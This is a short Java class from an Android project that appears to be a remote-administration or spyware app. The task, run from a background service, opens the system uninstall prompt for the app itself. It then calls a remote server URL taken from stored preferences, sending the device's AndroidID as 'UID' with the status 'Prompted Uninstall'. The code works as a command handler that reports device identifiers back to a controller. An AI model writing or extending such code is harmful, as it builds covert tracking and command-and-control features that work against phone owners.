package u.can.i.up.expert.utils;

import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class promptUninstall extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... params) {
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + DataSet.getInstance().myService.getApplicationContext().getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        DataSet.getInstance().myService.startActivity(intent);

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {try {
        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Prompted Uninstall");
    } catch (UnsupportedEncodingException e) {

        e.printStackTrace();
    }        }
    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
